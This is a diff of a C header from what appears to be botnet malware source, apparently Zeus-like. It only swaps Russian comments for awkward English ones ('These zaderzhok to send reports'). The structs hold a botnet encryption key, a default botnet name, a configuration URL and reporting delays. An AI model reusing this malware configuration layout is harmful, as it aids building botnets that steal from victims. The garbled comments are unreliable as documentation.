@@ -41,25 +41,25 @@ enum
 typedef struct
 {
   BYTE  padding0[80];
-  DWORD flags;                               //Флаги BCF_*.
+  DWORD flags;                               //Flags BCF_ *.
   BYTE  padding1[58];
-  DWORD delayStats;                          //Данные задержок для отправки статистики.
+  DWORD delayStats;                          //These zaderzhok to send statistics.
   BYTE  padding2[91];
-  char  defaultConfig[100 + 1];              //URL конфигурации по умолчанию.
+  char  defaultConfig[100 + 1];              //URL default configuration.
   BYTE  padding3[7];
-  Crypt::RC4KEY baseKey;                     //Ключ шифрования ботнета.
+  Crypt::RC4KEY baseKey;                     //The encryption key is a botnet.
   BYTE  padding4[77];
-  WCHAR defaultBotnet[BOTNET_MAX_CHARS + 1]; //Имя ботнета по умолчанию.
+  WCHAR defaultBotnet[BOTNET_MAX_CHARS + 1]; //The name of the botnet by default.
   BYTE  padding5[38];
-  DWORD delayReport;                         //Данные задержок для отправки отчетов.
+  DWORD delayReport;                         //These zaderzhok to send reports.
   BYTE  padding6[14];
-  DWORD delayConfig;                         //Данные задержок для загрузки конфигурации.
+  DWORD delayConfig;                         //These zaderzhok to download the configuration.
   BYTE  padding7[21];
 }BASECONFIG;
 
 typedef struct
 {
-  DWORD xorKey;      //Ключ шифрования.
-  DWORD installSize; //Размер CoreInstall::_install().
-  DWORD updateSize;  //Размер CoreInstall::_update().
+  DWORD xorKey;      //Encryption key.
+  DWORD installSize; //Size CoreInstall:: _install ().
+  DWORD updateSize;  //Size CoreInstall:: _update ().
 }INSTALLDATA;
